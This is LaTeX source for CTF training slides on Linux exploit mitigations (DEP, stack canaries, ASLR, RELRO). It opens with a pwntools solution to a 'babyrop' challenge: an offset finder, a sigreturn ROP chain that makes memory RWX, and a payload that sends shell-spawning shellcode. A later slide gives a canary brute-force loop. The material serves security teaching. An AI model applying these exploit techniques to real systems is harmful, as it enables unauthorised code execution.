\documentclass[aspectratio=169]{beamer}

\usepackage{../theme/polygl0ts}
\usepackage{drawstack}
\usepackage{pgfpages}

%\setbeameroption{show notes on second screen}

\tikzstyle{freecell}=[fill=none]

\newcommand{\reg}[1]{\%\mintinline{asm}{#1}}
\newcommand{\hex}[1]{\mintinline{python}{0x#1}}
\newcommand{\naddr}[2]{\begin{tabular}{l}#1\\\hex{#2}\end{tabular}}
\newcommand{\docl}[1]{(\textbf{\href{#1}{Documentation}})}

\hypersetup{colorlinks,linkcolor=,urlcolor=brightblue}

\setbeamertemplate{navigation symbols}{}

\showsectionframe

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% Title Setup
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\title{Lesson 3: Linux Hardening}
\subtitle{How to defeat Linux once and for all!}
\author{Leonardo Galli}
\date{\today}

\begin{document}
\titleframe

\tocframe

\section{Previous Challenge}
\begin{frame}
    \frametitle{Challenge}
    {
        \begin{alertblock}{\textbf{babyrop}}
            Oh no! Our fibonacci calculator is getting exploited, can you figure out how?
            I heard it had something to do with negative numbers...\\
            \textbf{Hints:} This binary has only readable memory, so you probably want to remove that limit ;)
            You will probably have to use a sigreturn frame for this, since there are not enough gadgets for all registers.
            Also, setting \reg{rax} is gonna require some effort :)\\
            \textbf{Files:} \href{https://flagbot.ch/babyrop.zip}{babyrop.zip}\\
            \textbf{Server:} google.jadoulr.tk 42001\\
            \textbf{Author:} Robin Jadoul
        \end{alertblock}
    }
\end{frame}

\begin{frame}[fragile]
    \frametitle{Overflow Offset}
    \pause
    \begin{itemize}
        \item Can use any technique to figure it out
        \item I used pwntools and coredumps with cyclic
        \item Offset is \hex{38}
    \end{itemize}
\end{frame}
\begin{frame}[fragile]
    \frametitle{Offset with pwntools}
    \begin{codebox}{python}
exe = context.binary = ELF("./rop")

# get offset
io = local()
io.sendline(b"0\0" + cyclic(128))
io.wait()

core = Coredump("./core")
offset = cyclic_find(core.fault_addr & 0xffffffff) + 2
log.info("Buffer has offset %d", offset)\end{codebox}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Now what?}
    \begin{itemize}
        \item We have a buffer overflow and know correct offset
        \item How can we get a shell?
        \item The whole binary is read-only, nothing is writable :(
        \pause
        \item Use mprotect / mmap to create RWX region for shellcoding!
        \item mprotect / mmap have a lot of arguments and binary does not have a lot of ROP gadgets
        \item Use a sigreturn syscall to set all registers!
    \end{itemize}
\end{frame}

\begin{frame}[fragile]
    \frametitle{mprotect SROP}
    \begin{itemize}
        \pause
        \item First we need a \inlinecode[asm]{ syscall; ret; } gadget: \hex{40127f}
        \item Next, we need a gadget (chain) for setting \reg{rax} to \hex{f} (15 in decimal)
        \pause
        \item Call \inlinecode[c]{ fib(-15) }, since \reg{rax} is return value!
        \item For this, we need to set \reg{rdi}, the first argument
        \item Can do this with the following two gadgets:
        \begin{itemize}
            \item \inlinecode[asm]{pop rbx; ...; ret; }: \hex{401186}
            \item \inlinecode[asm]{mov rdi, rbx; ret; }: \hex{401260}
        \end{itemize}
    \end{itemize}
\end{frame}

\begin{frame}[fragile]
    \frametitle{ROP Chain}
    \begin{codebox}{python}
frame = SigreturnFrame()
frame.rax = ... # setting up SROP here, explanation will come later

rop = ROP(exe)
rop.call(pop_rbx)
rop.raw(-constants.SYS_rt_sigreturn) # set rbx = -15
rop.raw("A"*8) # filler
rop.call(mov_rdi_rbx) # set rdi = rbx
rop.call(exe.symbols.fib) # call fib(rdi) = fib(-15) -> sets rax = 15
rop.call(syscall_ret) # jump to syscall ret gadget,
                      # since rax = 15 will execute sigreturn
rop.raw(frame) # sigreturn frame contents\end{codebox}
\end{frame}

\begin{frame}[fragile]
    \frametitle{SigreturnFrame Setup}
    \begin{itemize}
        \item Things we need to decide:
        \begin{itemize}
            \item mprotect or mmap?
            \item value of \reg{rip}
            \item value of \reg{rsp}
            \item plan for what to do after we return from syscall
        \end{itemize}
        \pause
        \item binary is not stripped, so we have list of its symbols somewhere in memory
        \item If we point \reg{rsp} to that location, we can continue ROPing! Our Plan:
        \begin{enumerate}
            \item mprotect the whole binary to RWX
            \item set \reg{rsp} to \hex{402240}, since we have a pointer to vuln there
            \item after mprotect, execute return, and so jumping back to vuln
            \item we can overflow again, but this time know the buffer location and it is RWX!
        \end{enumerate}
    \end{itemize}
\end{frame}

\begin{frame}[fragile]
    \frametitle{SigreturnFrame Setup}
    \begin{itemize}
        \item sigreturn can set all registers for us
        \item we set \reg{rsp} as explained before, \reg{rax} to \hex{a} (mprotect) and \reg{rip} to a \inlinecode[asm]{ syscall; ret; } gadget.
        \item hence our frame looks like:
    \end{itemize}
    \begin{codebox}{python}
frame = SigreturnFrame()
frame.rax = constants.SYS_mprotect # for syscall
frame.rdi = addr # address we want to mprotect, here 0x402000
frame.rsi = 0x1000 # amount of bytes we want to mprotect
frame.r10 = constants.MAP_FIXED # not really needed
frame.rdx = constants.eval('PROT_READ | PROT_WRITE | PROT_EXEC') # RWX
frame.rsp = 0x402240 # our "fake" stack after mprotect
frame.rip = syscall_ret # syscall ret gadget\end{codebox}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Shellcoding}
    \begin{itemize}
        \item now vuln is being executed again, however now we know buffer location and stack is RWX!
        \item buffer overflow, but use it to immediately jump to our buffer!
        \item fill rest of buffer contents with shellcode:
    \end{itemize}
    \begin{codebox}{python}
shellcode = 0x402250 # location of our buffer

io.sendline(fit({
    0: b"0\0",
    offset: shellcode, # overwrite rip with shellcode location
    offset + 8: asm(shellcraft.sh()) # shellcode for getting a shell
}))\end{codebox}
\end{frame}

{
\hidesectionframe
\showsubsectionframe
\section{Exploit Mitigations}

\subsection{Data Execution Prevention (DEP)}

\begin{frame}[fragile]
    \frametitle{The Good Old Days}
    \begin{itemize}
        \item Initially, CPU and OS did not care where \reg{rip} points to
        \item Could point to data (stack or program data) and would still continue executing
        \item Heavily abused by us for e.g. shellcoding (just write some shellcode in data and jump to data)
    \end{itemize}
\end{frame}

\begin{frame}
    \frametitle{Data Execution Prevention (DEP)}
    \begin{itemize}
        \item To alleviate this, allow marking of memory regions as not executable
        \item Has many different names, but they all mean a similar thing:
        \begin{itemize}
            \item NX (Non-Execute) Bit is hardware on x64 processors responsible for this
            \item No-Exec Stack GCC flag to mark stack non executable
            \item W\^{}X (Write XOR eXecute) in OpenBSD
        \end{itemize}
        \item Usually done in hardware, so quite effective
        \item When trying to jump to NX memory, program will segfault :(
        \item Enabled by default, even for most CTFs!
    \end{itemize}
\end{frame}

\begin{frame}
    \frametitle{Working Around DEP}
    \begin{itemize}
        \item ROPing is not directly prevented with DEP
        \item Use ROP to execute mmap / mprotect and DEP is "removed"
        \item Find memory region in binary that might still be RWX
        \item Sometimes RWX is necessary and hence can be exploited:
        \begin{itemize}
            \item Any JIT engine (Just In Time) such as JavaScript, Java or even C\# (with mono)
            \item Often Browsers are the main culprit
            \item In general, any interpreted language (also python)
        \end{itemize}
    \end{itemize}

\end{frame}

\subsection{Stack Canary}

\begin{frame}
    \frametitle{Up to Now}
    \begin{itemize}
        \item Any buffer overflow immediately leads to overwriting \reg{rip}
        \item Do not care about contents of buffer before \reg{rip}
    \end{itemize}

\end{frame}

\begin{frame}
    \frametitle{Stack Canary}
    \begin{itemize}
        \item Prevent Buffer Overflows by adding a secret value in front of \reg{rip}
        \item Check the integrity of the secret value before returning!
        \item Many different names:
        \begin{itemize}
            \item Stack Smashing Protector (SSP)
            \item Stack Cookie / Canary
        \end{itemize}
        \item Is generated per-process, not per-function!
        \item Usually, first byte is a null-byte, and hence you cannot leak it easily
        \item Enabled by default for normal applications (CTFs not necessarily!)
    \end{itemize}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Example 1: Need for a Null Byte}
    \begin{columns}
        \begin{column}{0.5\textwidth}
        \begin{codebox}{c}
int callme() {
    long canary = get_canary();
    char name[16];
    gets(name); |\nline{1}|
    printf("Hello %s", name); |\nline{2}|
    if (canary != get_canary())
        __stack_chk_fail();
    return 2; |\nline{3}|
}\end{codebox}
        \end{column}
        \begin{column}{0.5\textwidth}
            \begin{figure}[H]
                \centering
                \begin{drawstack}[scale=0.7, every node/.style={scale=0.7}]
                    \startframe
                    \cell{\hex{7fe0}} \cellcom{\naddr{saved \reg{rbp}}{7fc0}}
                    \cell{\hex{4012ae}}\cellcom{\naddr{saved \reg{rip}}{7fb8}}
                    \cell{\hex{8ba01867943f8f78}}\cellcom{\naddr{canary}{7fb0}}
                    \cell{} \cellcom{\naddr{\mintinline{c}{name[8:15]}}{7fa8}}
                    \node[draw,minimum height=1cm,anchor=east] (n8) at (2, \value{cellnb}) {\only<1>{\mintinline{c}{n[8]}}\only<2->{\mintinline{c}{'A'}}};
                    \node[] at (0, \value{cellnb}) {\dots};
                    \node[draw,minimum height=1cm,anchor=west] (n15) at (-2, \value{cellnb}) {\only<1>{\mintinline{c}{n[15]}}\only<2->{\mintinline{c}{'A'}}};
                    \cell{} \cellcom{\naddr{\mintinline{c}{name[0:7]}}{7fa0}}
                    \node[draw,minimum height=1cm,anchor=east] (n0) at (2, \value{cellnb}) {\only<1>{\mintinline{c}{n[0]}}\only<2->{\mintinline{c}{'A'}}};
                    \node[] at (0, \value{cellnb}) {\dots};
                    \node[draw,minimum height=1cm,anchor=west] (n7) at (-2, \value{cellnb}) {\only<1>{\mintinline{c}{n[7]}}\only<2->{\mintinline{c}{'A'}}};
                    \finishframe{{\tt callme}\\stack frame}
    
                    \draw[->] (2.15,0) -- node[auto, sloped]{stack growth} (2.15, \value{cellnb}-1);
                \end{drawstack}
                  
                
                \caption{The Stack}
                \label{fig:stack}
            \end{figure}
        \end{column} 
        \end{columns}
        \begin{onlyenv}<2>
        Output: \inlinecode[python]{"Hello AAAAAAAAAAAAAAAAx???g??"}
        \end{onlyenv}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Example 2: Leaking with Null Byte}
    \begin{columns}
        \begin{column}{0.5\textwidth}
        \begin{codebox}{c}
int callme() {
    long canary = get_canary();
    char name[16];
    gets(name); |\nline{1}|
    printf("Hello %s", name); |\nline{2}|
    if (canary != get_canary())
        __stack_chk_fail();
    return 2; |\nline{3}|
}\end{codebox}
        \end{column}
        \begin{column}{0.5\textwidth}
            \begin{figure}[H]
                \centering
                \begin{drawstack}[scale=0.7, every node/.style={scale=0.7}]
                    \startframe
                    \cell{\hex{7fe0}} \cellcom{\naddr{saved \reg{rbp}}{7fc0}}
                    \cell{\hex{4012ae}}\cellcom{\naddr{saved \reg{rip}}{7fb8}}
                    \cell{\hex{8ba01867943f8f00}}\cellcom{\naddr{canary}{7fb0}}
                    \cell{} \cellcom{\naddr{\mintinline{c}{name[8:15]}}{7fa8}}
                    \node[draw,minimum height=1cm,anchor=east] (n8) at (2, \value{cellnb}) {\only<1>{\mintinline{c}{n[8]}}\only<2->{\mintinline{c}{'A'}}};
                    \node[] at (0, \value{cellnb}) {\dots};
                    \node[draw,minimum height=1cm,anchor=west] (n15) at (-2, \value{cellnb}) {\only<1>{\mintinline{c}{n[15]}}\only<2->{\mintinline{c}{'A'}}};
                    \cell{} \cellcom{\naddr{\mintinline{c}{name[0:7]}}{7fa0}}
                    \node[draw,minimum height=1cm,anchor=east] (n0) at (2, \value{cellnb}) {\only<1>{\mintinline{c}{n[0]}}\only<2->{\mintinline{c}{'A'}}};
                    \node[] at (0, \value{cellnb}) {\dots};
                    \node[draw,minimum height=1cm,anchor=west] (n7) at (-2, \value{cellnb}) {\only<1>{\mintinline{c}{n[7]}}\only<2->{\mintinline{c}{'A'}}};
                    \finishframe{{\tt callme}\\stack frame}
    
                    \draw[->] (2.15,0) -- node[auto, sloped]{stack growth} (2.15, \value{cellnb}-1);
                \end{drawstack}
                  
                
                \caption{The Stack}
                \label{fig:stack}
            \end{figure}
        \end{column} 
        \end{columns}
        \begin{onlyenv}<2>
        Output: \inlinecode[python]{"Hello AAAAAAAAAAAAAAAA"}
        \end{onlyenv}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Example 3: Leaking with Null Byte and Crashing}
    \begin{columns}
        \begin{column}{0.5\textwidth}
        \begin{codebox}{c}
int callme() {
    long canary = get_canary();
    char name[16];
    gets(name); |\nline{1}|
    printf("Hello %s", name); |\nline{2}|
    if (canary != get_canary())
        __stack_chk_fail(); |\nline{3}|
    return 2; 
}\end{codebox}
        \end{column}
        \begin{column}{0.5\textwidth}
            \begin{figure}[H]
                \centering
                \begin{drawstack}[scale=0.7, every node/.style={scale=0.7}]
                    \startframe
                    \cell{\hex{7fe0}} \cellcom{\naddr{saved \reg{rbp}}{7fc0}}
                    \cell{\hex{4012ae}}\cellcom{\naddr{saved \reg{rip}}{7fb8}}
                    \cell{\only<1>{\hex{8ba01867943f8f00}}\only<2->{\hex{8ba01867943f8f41}}}\cellcom{\naddr{canary}{7fb0}}
                    \cell{} \cellcom{\naddr{\mintinline{c}{name[8:15]}}{7fa8}}
                    \node[draw,minimum height=1cm,anchor=east] (n8) at (2, \value{cellnb}) {\only<1>{\mintinline{c}{n[8]}}\only<2->{\mintinline{c}{'A'}}};
                    \node[] at (0, \value{cellnb}) {\dots};
                    \node[draw,minimum height=1cm,anchor=west] (n15) at (-2, \value{cellnb}) {\only<1>{\mintinline{c}{n[15]}}\only<2->{\mintinline{c}{'A'}}};
                    \cell{} \cellcom{\naddr{\mintinline{c}{name[0:7]}}{7fa0}}
                    \node[draw,minimum height=1cm,anchor=east] (n0) at (2, \value{cellnb}) {\only<1>{\mintinline{c}{n[0]}}\only<2->{\mintinline{c}{'A'}}};
                    \node[] at (0, \value{cellnb}) {\dots};
                    \node[draw,minimum height=1cm,anchor=west] (n7) at (-2, \value{cellnb}) {\only<1>{\mintinline{c}{n[7]}}\only<2->{\mintinline{c}{'A'}}};
                    \finishframe{{\tt callme}\\stack frame}
    
                    \draw[->] (2.15,0) -- node[auto, sloped]{stack growth} (2.15, \value{cellnb}-1);
                \end{drawstack}
                  
                
                \caption{The Stack}
                \label{fig:stack}
            \end{figure}
        \end{column} 
        \end{columns}
        \begin{onlyenv}<2>
        Output: \inlinecode[python]{"Hello AAAAAAAAAAAAAAAAA???g??"}
        \end{onlyenv}
        \begin{onlyenv}<3>
        Output: \inlinecode[python]{"*** stack smashing detected ***: <unknown> terminated"}
        \end{onlyenv}
\end{frame}

\begin{frame}
    \frametitle{Working Around Stack Canaries}
    \begin{itemize}
        \item If you have a relative (or absolute) write to memory, you can skip writing the canary!
        \item You can try leaking the canary, if you have a way to read memory
        \item If return never called (or not immediately), you can still overwrite Null Byte and leak canary
        \item Overwrite global data (not protected)
        \begin{itemize}
            \item Could allow overwriting of addresses, if they are stored in global variables
            \item Or overwriting of ELF information
        \end{itemize}
    \end{itemize}
\end{frame}

\subsection{Address Space Layout Randomization (ASLR)}
\begin{frame}
    \frametitle{Up to Now}
    \begin{itemize}
        \item Code execution is very deterministic
        \item Once you found a usable address (with e.g. gdb) you can reuse it
        \item In the "good old days", everything was deterministic, even stack!
        \item Made exploitation very easy, since you always knew where stack and libc were
    \end{itemize}

\end{frame}

\begin{frame}
    \frametitle{Address Space Layout Randomization (ASLR)}
    \begin{itemize}
        \item Randomize memory layout to make exploitation more difficult
        \item Stack can be at randomized location automatically and is done by default on most OS
        \item For code, programmer needs to compile with PIC (Position Independent Code) generating a PIE (Position Independent Executable)
        \begin{itemize}
            \item Done by default for shared libraries such as libc
            \item You cannot know where system function is, without knowing base of libc
            \item Often, main program is not compiled with PIC however
            \item If main program is compiled with PIC, you cannot easily use gadgets!
        \end{itemize}
        \item Only base address is randomized, not e.g. the relative positions of different functions!
        \item Once you know the base of a PIE, you know where all functions are!
    \end{itemize}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Randomization}
    \begin{itemize}
        \item Pages have to be aligned, meaning lowest 12 bits are known!
        \item Address space restricted in x86, for example PIE base only has 8 bits of randomization!
        \item On x64 much more bits available!
        \item Not re-applied when you call \inlinecode[c]{fork()}!
    \end{itemize}
\end{frame}

\subsection{General Tips against Randomization}

\begin{frame}
    \frametitle{Partial Overwrites}
    \begin{itemize}
        \item A lot of places store existing addresses (such as GOT or stack)
        \item Only overwrite part of existing address!
        \begin{itemize}
            \item If new and old address share last byte, no bruteforce needed!
            \item Often however, they differ in the last two or three bytes.
            \item Still, only 4-12 bits of brute force needed!
        \end{itemize}
    \end{itemize}

\end{frame}

\begin{frame}[fragile]
    \frametitle{Forking is bad}
    \begin{itemize}
        \item Nothing is re-randomized when you call \inlinecode[c]{fork()}!
        \item If you cause a crash in the child, parent will still have same canary, PIE base, etc.
        \item Often useful in programs that handle their own network connection:
        \begin{itemize}
            \item Accept incoming connection
            \item Fork
            \item If in child, run actually program (you will be talking to the child)
            \item If in parent continue accepting connections
        \end{itemize}
    \end{itemize}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Leaking with Forks}
    \begin{itemize}
        \item Can overwrite Null Byte for a leak, since crash is not important
        \item Can brute force byte by byte:
        \begin{codebox}{python}
for byte in range(0, 255): # usually first byte should be null!
    payload = fit(canary_offset: p8(byte)) # don't use p64,
            # otherwise you will overwrite all of the canary!
    did_crash = send_payload(payload)
    if not did_crash:
        log.info("First byte of canary is: 0x%x", byte)
        break\end{codebox}
    \end{itemize}
\end{frame}

\subsection{Relocation Read-Only (RELRO)}

\begin{frame}
    \frametitle{Dynamic Symbol Resolution}
    \begin{itemize}
        \item libc is an example of a dynamic library, any symbols used are dynamically resolved
        \item If libc is randomized, how can binary know where e.g. system is located?
        \item Procedural Linkage Table (PLT) and Global Offset Table (GOT) to the rescue!
        \begin{itemize}
            \item GOT stores addresses of dynamic symbols
            \item PLT contains small stubs, that jump to the address stored in the GOT
            \item At the beginning GOT points back to PLT, which in turn then jumps to linker to resolve symbol location and write to GOT
            \item Once symbol is resolved once, PLT will directly jump to correct address
        \end{itemize}
    \end{itemize}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Using GOT to our Advantage}
    \begin{itemize}
        \item If we call \inlinecode[c]{puts(printf@got)} we can leak libc address!
        \item If we overwrite GOT entry, we can execute arbitrary symbols!
        \item Can be achieved with ROP, data segment overflow or other means
        \item Usually, want to overwrite something like exit, since it will be called at the end
    \end{itemize}

\end{frame}

\begin{frame}
    \frametitle{Partial RELRO}
    \begin{itemize}
        \item Rearrange sections, so that global data overflow should not overflow into GOT, PLT, etc.
        \item Maps parts of the GOT read-only
        \item However, important parts are still read-write!
    \end{itemize}
\end{frame}

\begin{frame}
    \frametitle{Full RELRO}
    \begin{itemize}
        \item Do everything from Partial RELRO
        \item Resolve all symbols before main function runs
        \item Map all of the GOT as read-only!
        \item However, often not used, as it can slow down program startup time!
    \end{itemize}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Defeating Full RELRO}
    \begin{itemize}
        \item Currently, no way of actually defeating full RELRO known
        \item However, there are always other sections which can be overwritten leading to code execution:
        \begin{itemize}
            \item global file structs
            \item \inlinecode[c]{__malloc_hook}
            \item linker global symbols
            \item etc.
        \end{itemize}
        \item More information in Further Readings
    \end{itemize}

\end{frame}
}

\section{Other Tips}

\begin{frame}[fragile]
    \frametitle{Identifying Protections}
    \begin{itemize}
        \item pwntools includes helper program called checksec
        \item Usage: \inlinecode[bash]{checksec ./vuln}
        \item Shows you:
        \begin{itemize}
            \item Architecture
            \item RELRO (No, Partial, Full)
            \item Stack Canary (No, Yes)
            \item NX (No, Yes): No-Exec Stack
            \item PIE (No, Yes)
            \item If there are RWX segments present
        \end{itemize}
    \end{itemize}

\end{frame}

\begin{frame}
    \frametitle{Identifying a Libc}
    \begin{itemize}
        \item To find exact address of system or one gadgets, you need to have exact libc binary!
        \item Easy to do, if running locally, but what about the server?
        \pause
        \item Different symbols always have the same relative address for the same binary!
        \item Leak address of three or four libc symbols
        \item Use online database \href{https://libc.blukat.me}{libc database} to find the one on the server
    \end{itemize}
\end{frame}

\begin{frame}[fragile]
    \frametitle{one\_gadget}
    \begin{itemize}
        \item Setting up arguments for execve / system call can be annoying
        \item Usually, libc can do the work for you!
        \item one\_gadget is a tool that will give you addresses in libc, which call \inlinecode[c]{execve("/bin/sh", 0, 0)} for you
        \item Will also tell you any constraints you need to fulfill, to prevent a crash
    \end{itemize}

\end{frame}

\section{Further Readings}
\begin{frame}[fragile]
    \frametitle{Defeating Mitigations}
    \begin{itemize}
        \item ASLR
        \begin{itemize}
            \item \href{https://www.blackhat.com/docs/asia-16/materials/asia-16-Marco-Gisbert-Exploiting-Linux-And-PaX-ASLRS-Weaknesses-On-32-And-64-Bit-Systems-wp.pdf}{Exploiting Linux and PaX ASLR’s weaknesses on 32- and 64-bit systems}
        \end{itemize}
        \item Full RELRO
        \begin{itemize}
            \item \href{https://atum.li/2017/11/08/babyfs/}{BabyFS Writeup}: Abusing file structs 
            \item \href{https://made0x78.com/bseries-fullrelro/}{Full RELRO Bypass} using \inlinecode[c]{__malloc_hook}
            \item \href{}{} using libc exit routines
        \end{itemize}
    \end{itemize}
\end{frame}

\section{Challenge}

\begin{frame}[fragile]
    \frametitle{Challenge}
    {
        \begin{alertblock}{\textbf{protections}}
            On the surface this challenge should be very easy to exploit, however, there are some protections...\\
            \textbf{Hints:} No hints this time! Please do not run to many concurrent attempts, otherwise the server will be overloaded!\\
            \textbf{Files:} \href{https://flagbot.ch/protections.zip}{protections.zip}\\
            \textbf{Server:} google.jadoulr.tk 42002\\
            \textbf{Author:} Robin Jadoul
        \end{alertblock}
    }
\end{frame}
\end{document}